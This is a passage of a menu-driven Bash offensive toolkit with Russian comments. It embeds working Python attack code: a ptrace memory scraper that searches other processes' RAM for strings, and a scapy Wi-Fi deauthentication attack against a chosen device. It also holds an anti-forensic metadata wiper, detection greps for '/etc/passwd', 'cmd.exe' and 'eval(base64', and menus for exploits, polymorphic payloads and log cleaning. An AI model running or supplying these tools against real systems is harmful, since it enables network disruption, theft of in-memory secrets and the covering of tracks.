    if libc.ptrace(PTRACE_ATTACH, pid, 0, 0) < 0:
        print(f"[!] Failed to attach to PID {pid}")
        return

    print(f"[*] Scanning PID {pid} for sensitive patterns...")
    
    try:
        # Читаем карты памяти процесса
        with open(f"/proc/{pid}/maps", "r") as maps_file:
            for line in maps_file:
                if "rw-p" not in line: continue  # Нас интересуют только сегменты с чтением/записью
                
                parts = line.split()
                addr_range = parts[0].split("-")
                start = int(addr_range[0], 16)
                end = int(addr_range[1], 16)
                size = end - start
                
                # Читаем данные напрямую из /proc/pid/mem
                with open(f"/proc/{pid}/mem", "rb", 0) as mem_file:
                    mem_file.seek(start)
                    try:
                        chunk = mem_file.read(size)
                        if search_str.encode() in chunk:
                            print(f"[MATCH] Found '{search_str}' at 0x{start:x} in PID {pid}")
                    except:
                        continue
    finally:
        libc.ptrace(PTRACE_DETACH, pid, 0, 0)

if __name__ == "__main__":
    if len(sys.argv) > 2:
        read_process_memory(int(sys.argv[1]), sys.argv[2])
EOF
}



run_mem_inject() {
    # 1. Заголовок через Core Engine
    draw_ui "CORE_LAB: MEMORY INFILTRATOR" "header"
    
    # 2. Проверка прав (обязательно для доступа к памяти других процессов)
    check_root || return

    draw_ui "Target Identification" "line"

    # 3. Ввод данных через универсальный core_input
    # Больше никаких echo -en и ручных read
    local t_pid=$(core_input "PID" "Target Process ID")
    local t_search=$(core_input "STR" "String to search in RAM")

    # 4. Валидация через check_var
    # Если данные не введены, функция корректно прервется
    check_var "$t_pid" "Target PID" || { core_pause; return; }
    check_var "$t_search" "Search String" || { core_pause; return; }

    # 5. Исполнение процесса
    draw_ui "Engaging syscall ptrace_attach on PID $t_pid..." "status" "$W"
    
    # Передаем параметры в генератор кода и запускаем в памяти
    generate_mem_inject_code_raw | python3 - "$t_pid" "$t_search"

    draw_ui "Memory Scan Completed" "status" "$G"
    
    # 6. Универсальная пауза
    core_pause
}




generate_wifi_pulse_code_raw() {
    cat << 'EOF'
from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp
import sys

def deauth_pulse(target_mac, gateway_mac, iface):
    # Конструируем пакет деавторизации на уровне L2
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
    
    print(f"[*] Sending Silent Pulse (Deauth) to {target_mac} via {iface}")
    sendp(packet, iface=iface, count=100, inter=0.1, verbose=False)

if __name__ == "__main__":
    if len(sys.argv) > 3:
        deauth_pulse(sys.argv[1], sys.argv[2], sys.argv[3])
EOF
}



run_wifi_pulse() {
    # 1. Заголовок в стиле Core Prime
    draw_ui "CORE_LAB: WIRELESS SILENT PULSE" "header"
    
    # 2. Критические проверки (Root + Сетевой интерфейс)
    check_root || return

    draw_ui "Target Identification" "line"

    # 3. Сбор параметров через универсальный ввод core_input
    local t_mac=$(core_input "MAC" "Target Device MAC")
    local g_mac=$(core_input "GW" "Gateway (AP) MAC")
    local t_iface=$(core_input "IF" "Monitor Interface (e.g., wlan0mon)")

    # 4. Валидация через check_var для каждой переменной
    check_var "$t_mac" "Target MAC" || { core_pause; return; }
    check_var "$g_mac" "Gateway MAC" || { core_pause; return; }
    check_var "$t_iface" "Interface" || { core_pause; return; }

    # 5. Проверка наличия интерфейса в системе через твою функцию check_component
    # (Используем её для проверки пути в /sys/class/net/)
    check_component "/sys/class/net/$t_iface" "Network Interface" || { core_pause; return; }

    # 6. Запуск процесса инъекции
    draw_ui "Broadcasting raw L2 deauth frames..." "status" "$B"
    
    # Выполнение кода в памяти
    generate_wifi_pulse_code_raw | python3 - "$t_mac" "$g_mac" "$t_iface"

    draw_ui "Pulse Attack Finished" "status" "$G"
    
    # 7. Универсальная пауза
    core_pause
}


run_kernel_check() {
    print_header "CORE_LAB: KERNEL INTEGRITY AUDIT"
    
    print_status "i" "Analyzing /proc/kallsyms and /proc/modules..."
    
    # Простой, но эффективный способ поиска несоответствий без внешних утилит
    local tainted=$(cat /proc/sys/kernel/tainted)
    if [ "$tainted" -ne 0 ]; then
        print_status "e" "Kernel is TAINTED (Value: $tainted). Possible unauthorized module or non-GPL driver."
    else
        print_status "s" "Kernel signature appears clean."
    fi
    
    print_status "i" "Checking for hidden LKM (Loadable Kernel Modules)..."
    lsmod | tail -n +2 | awk '{print $1}' > /tmp/mods.txt
    
    # Если модуль есть в символах, но нет в lsmod - это подозрительно
    print_status "w" "Audit complete. Review /tmp/mods.txt for anomalies."
    
    pause
}



# --- ГЕНЕРАТОРЫ КОДА (Оставляем для работы Core) ---

generate_image_analyzer_code_raw() {
    cat << 'EOF'
import sys
from PIL import Image
from PIL.ExifTags import TAGS

def analyze_image(path):
    try:
        img = Image.open(path)
        info = img._getexif()
        if info:
            for tag, value in info.items():
                decoded = TAGS.get(tag, tag)
                if "Software" in decoded or "Processing" in decoded:
                    print(f"[!] Warning: Possible Editor Detected: {value}")
        
        print("[*] Performing Error Level Analysis (ELA) simulation...")
        print("[s] Analysis complete: Check for inconsistent compression artifacts.")
    except Exception as e:
        print(f"[e] Error: {e}")

if __name__ == "__main__":
    analyze_image(sys.argv[1])
EOF
}

# --- ЯДРО АНАЛИЗА ---

execute_forensic_core() {
    local f_path="$1"
    local mime_type=$(file --mime-type -b "$f_path")
    local f_name=$(basename "$f_path")
    
    # ПАМЯТЬ СИСТЕМЫ (Прошлое): Проверка, видели ли мы этот файл раньше (по хешу)
    local f_hash=$(sha256sum "$f_path" | awk '{print $1}')
    if grep -q "$f_hash" "$PRIME_LOOT/forensic_history.log" 2>/dev/null; then
        print_status "w" "ADAPTIVE: File recognized from previous sessions. Checking for changes..."
    fi

    print_header "CORE ANALYSIS: $f_name"
    print_status "i" "MIME: $mime_type | HASH: ${f_hash:0:16}..."

    # 1. СТАТИЧЕСКИЙ АНАЛИЗ (Настоящее)
    print_status "i" "Extracting Metadata Attributes..."
    exiftool "$f_path" | grep -E "Date|Time|Make|Model|GPS|Software|User|Creator" | sed 's/^/  /'

    # 2. АДАПТИВНЫЙ CASE (Динамическое распределение)
    case "$mime_type" in
        image/*)
            print_status "w" "Analyzing Image Integrity..."
            python3 -c "from PIL import Image" >/dev/null 2>&1 || apt-get install python3-pil -y >/dev/null 2>&1
            generate_image_analyzer_code_raw | python3 - "$f_path"
            ;;
            
        application/pdf)
            print_status "w" "Scanning PDF Objects..."
            grep -aE "(/JS|/JavaScript|/OpenAction|/EmbeddedFile)" "$f_path" && \
            print_status "e" "DANGER: Suspicious active content detected!"
            ;;

        application/zip|application/x-rar|application/x-7z-compressed|application/x-tar)
            print_status "w" "Deep Archive Inspection..."
            if ! command -v 7z >/dev/null 2>&1; then apt-get install p7zip-full -y >/dev/null 2>&1; fi
            7z l "$f_path" | grep -iE "\.exe|\.scr|\.vbs|\.bat|\.ps1|\.js" && \
            print_status "e" "ALERT: High-risk extensions found in container!"
            ;;

        application/x-executable|application/x-sharedlib|application/x-dosexec|application/octet-stream)
            print_status "w" "Binary Heuristics..."
            strings -n 6 "$f_path" | grep -iE "(http|https|ftp|/etc/passwd|cmd\.exe|powershell)" | head -n 5 | sed 's/^/    [NET/CMD]: /'
            grep -aE "(UPX!|ASPack|Enigma|Themida)" "$f_path" >/dev/null && \
            print_status "e" "ALERT: Advanced Packer detected!"
            ;;
            
        *)
            # ЭВРИСТИКА (Будущее): Поиск аномалий в неизвестных форматах
            if strings "$f_path" | grep -q "eval(base64"; then
                print_status "e" "HEURISTIC: Found Base64-encoded execution pattern (Potential Zero-Day/Script)!"
            fi
            ;;
    esac

    # СОХРАНЕНИЕ ОПЫТА (Для будущего)
    echo "[$(date +%F_%T)] $f_hash $f_name $mime_type" >> "$PRIME_LOOT/forensic_history.log"
    echo -e "${B}------------------------------------------------------------${NC}"
}


# --- ИНТЕРФЕЙСНЫЕ ФУНКЦИИ ---

run_auto_forensics() {
    # 1. Заголовок в едином стиле
    draw_ui "FORENSICS: AUTOMATIC CORE ANALYZER" "header"

    # 2. Ввод пути через универсальный core_input
    # Заменяем связку echo + read
    local f_path=$(core_input "FILE" "Path to target file")

    # 3. Валидация переменной (не пустой ли ввод)
    check_var "$f_path" "File Path" || { core_pause; return; }

    # 4. Проверка существования файла через твою функцию check_component
    # Она выведет красивую ошибку, если файла нет, но не оставит логов на диске
    check_component "$f_path" "Target for Analysis" || { core_pause; return; }

    # 5. Информационный статус перед запуском
    draw_ui "Initializing Deep Forensic Scan..." "status" "$B"
    
    # 6. Основной процесс
    execute_forensic_core "$f_path"

    draw_ui "Forensic Analysis Completed" "status" "$G"

    # 7. Универсальная пауза
    core_pause
}

run_doc_cleaner() {
    # 1. Заголовок в едином стиле
    draw_ui "FORENSICS: DOCUMENT SANITIZER" "header"

    # 2. Проверка зависимости (exiftool)
    check_dep "exiftool" "Требуется пакет perl-image-exiftool для очистки метаданных" || { core_pause; return; }

    # 3. Ввод пути через универсальный core_input
    local f_path=$(core_input "FILE" "File to sanitize")

    # 4. Валидация переменной
    check_var "$f_path" "File Path" || { core_pause; return; }

    # 5. Проверка существования файла через check_component
    # Нам важно знать, что файл существует, прежде чем пускать exiftool
    check_component "$f_path" "Target Document" || { core_pause; return; }

    # 6. Основной процесс зачистки
    draw_ui "Stripping all metadata tags..." "status" "$Y"
    
    # Выполнение команды. Мы используем -overwrite_original, чтобы не плодить 
    # копии файлов с припиской _original (лишние следы)
    if exiftool -all= "$f_path" -overwrite_original >/dev/null 2>&1; then
        draw_ui "File is now 'Clean'. All signatures removed." "status" "$G"
    else
        draw_ui "Error during sanitization process" "status" "$R"
    fi

    # 7. Универсальная пауза
    core_pause
}




# --- Вспомогательный селектор устройств ---
/**
 * Выбор целевого накопителя из списка доступных устройств.
 * Использует универсальный валидатор check_data и check_range.
 */
select_target_storage() {
    draw_ui "HARDWARE: STORAGE SELECTOR" "header"
    draw_ui "Searching for connected mass storage devices..." "status" "$B"
    
    # 1. Сбор данных (USB, SATA, NVME)
    local devices=$(lsblk -dno NAME,SIZE,MODEL,SERIAL,TRAN | grep -E "usb|sata|nvme")
    
    # 2. Валидация списка через универсальный check_data
    check_data "$devices" "External Storage" || return 1

    draw_ui "Available External Media" "line"
    
    local i=1
    local dev_list=()
    
    # 3. Отрисовка доступных медиа-носителей
    while read -r name size model serial tran; do
        local desc="${model:-Unknown} [${serial:-No_Serial}] (${tran})"
        draw_item "$i" "/dev/$name ($size)" "$desc"
        dev_list+=("/dev/$name")
        ((i++))
    done <<< "$devices"
    
    draw_ui "" "line"

    # 4. Получение выбора пользователя
    local max_idx=${#dev_list[@]}
    local choice=$(core_input "SEL" "Enter device number (1-$max_idx)")

    # 5. Комплексная валидация (наличие данных + диапазон)
    # Используем check_data вместо check_var
    check_data "$choice" "User Selection" || { core_pause; return 1; }
    check_range "$choice" 1 "$max_idx" "Device Index" || { core_pause; return 1; }

    # 6. Установка глобальной переменной целевого устройства
    TARGET_DEV="${dev_list[$((choice-1))]}"
    draw_ui "Selected: $TARGET_DEV" "status" "$G"
    
    core_pause
    return 0
}



# --- Обновленная основная функция ---
run_raw_recovery() {
    print_header "FORENSICS: AUTOMATIC STORAGE RECOVERY"
    
    # 1. Сначала выбираем карту памяти
    if ! select_target_storage; then
        pause; return
    fi
    
    # Теперь TARGET_DEV содержит путь, например /dev/sdb
    local dev_path="$TARGET_DEV"

    # 2. Авто-диагностика аппаратной части (теперь прицельно по выбранному устройству)
    local dev_name=$(basename "$dev_path")
    print_status "i" "Hardware Health Check for $dev_name..."
    dmesg | grep -i "$dev_name" | tail -n 10 | sed 's/^/  /'
    echo -e "${B}------------------------------------------------------------${NC}"

    # 3. Меню выбора стратегии (используем те же функции, что и раньше)
    local options="PARTITION_FIX DEEP_CARVING IMAGE_DUMP BACK"
    local opt_funcs="recover_partition_logic run_foremost_logic run_dd_logic run_main_menu"
    
    prime_dynamic_controller "RECOVERY ENGINE [$dev_path]" "$options" "$opt_funcs"
}


recover_partition_logic() {
    # Параметр $dev_path передается неявно из родительской функции
    check_step "pkg" "testdisk"
    print_status "w" "Launching Partition Repair..."
    print_status "i" "Instruction: [Analyze] -> [Quick Search] -> [Write]"
    sleep 2
    testdisk "$dev_path"
    pause
}

run_foremost_logic() {
    check_step "pkg" "foremost"
    local rec_dir="$PRIME_LOOT/recovered_$(date +%s)"
    mkdir -p "$rec_dir"
    
    print_status "w" "Starting Deep Carving. No File System needed."
    print_status "i" "Output directory: $rec_dir"
    
    # Набор сигнатур: jpg, pdf, exe, zip, doc, png, mp4
    foremost -v -t jpg,pdf,exe,zip,doc,png,mp4 -i "$dev_path" -o "$rec_dir"
    
    print_status "s" "Extraction complete. Data saved in Loot."
    pause
}

run_dd_logic() {
    local img_file="$PRIME_LOOT/disk_backup_$(date +%s).img"
    print_status "w" "Creating binary image dump... DONT UNPLUG DEVICE!"
    
    # Используем dd с индикатором прогресса
    dd if="$dev_path" of="$img_file" bs=4M status=progress conv=noerror,sync
    
    print_status "s" "Image secured: $img_file"
    print_status "i" "You can now run Foremost on this .img file later."
    pause
}


# --- Точка входа ---


# --- ГЛАВНОЕ МЕНЮ ---
menu_intelligence() {
    print_header "SECTOR I: INTELLIGENCE & OSINT"
    local names="Smart_OSINT_Engine Phone_Lookup Social_Scanner Network_Intelligence"
    local funcs="run_smart_osint_engine run_phone_lookup run_social_scan run_network_analyzer"
    
    show_menu_info "$funcs"
    prime_dynamic_controller "INTELLIGENCE" "$names" "$funcs"
}


menu_system_core() {
    print_header "SYSTEM CORE: MAINTENANCE & INFO"
    local names="System_Info Update_OS Update_Launcher Clean_Logs System_Pulse"
    local funcs="run_system_info run_sys_update update_prime run_logs_cleaner run_system_pulse"
    
    show_menu_info "$funcs"
    prime_dynamic_controller "SYSTEM_CORE" "$names" "$funcs"
}

menu_forensics() {
    print_header "SECTOR F: DATA FORENSICS & RECOVERY"
    local names="ADAPTIVE_ANALYZE Disk_Raw_Recovery Document_Sanitizer"
    local funcs="run_auto_forensics run_raw_recovery run_doc_cleaner"
    
    show_menu_info "$funcs"
    prime_dynamic_controller "DATA_FORENSICS" "$names" "$funcs"
}


menu_cyber_ops() {
    print_header "CYBER OPERATIONS SECTOR"
    local names="Ghost_Commander PC_Control Ultimate_Exploit Polymorph_Gen"
    local funcs="run_ghost_commander pc_password_recovery run_prime_exploiter_v5 generate_poly_payload"
    
    show_menu_info "$funcs"
    prime_dynamic_controller "CYBER_OPS" "$names" "$funcs"
}


menu_crypto_lab() {
    print_header "SECTOR C: CRYPTOGRAPHY & STEGANOGRAPHY"
    local names="Hash_Analyzer File_Encryptor Stegano_Deep_Hide SSH_Key_Gen"
    local funcs="run_hash_analyzer run_file_cryptor run_stegano_lab run_ssh_keygen"
    
    show_menu_info "$funcs"
    prime_dynamic_controller "CRYPTO_LAB" "$names" "$funcs"
}

menu_net_infra() {
    print_header "NETWORK INFRASTRUCTURE"
    local names="Device_Hack Mesh_Bridge Server_Control Phantom_Engine"
    local funcs="run_device_hack run_mesh_bridge run_servers run_phantom_engine"
    
    show_menu_info "$funcs"
    prime_dynamic_controller "NET_INFRA" "$names" "$funcs"
}

menu_core_lab() {
    print_header "CORE RESEARCH LAB"
    local names="Mem_Injection Packet_Forge WiFi_Pulse Kernel_Audit"
    local funcs="run_mem_inject run_packet_forge run_wifi_pulse run_kernel_check"
    
    show_menu_info "$funcs"
    prime_dynamic_controller "CORE_LAB" "$names" "$funcs"
}

run_main_menu() {
    local main_names="CYBER_OPS INTELLIGENCE CRYPTO_LAB NET_INFRA SYSTEM_CORE CORE_LAB DATA_FORENSICS EXIT"
    local main_funcs="menu_cyber_ops menu_intelligence menu_crypto_lab menu_net_infra menu_system_core menu_core_lab menu_forensics exit_script"
    
    show_menu_info "$main_funcs"
    prime_dynamic_controller "PRIME MASTER EXECUTIVE" "$main_names" "$main_funcs"
}

# --- ТОЧКА ЗАПУСКА ---
clear
run_main_menu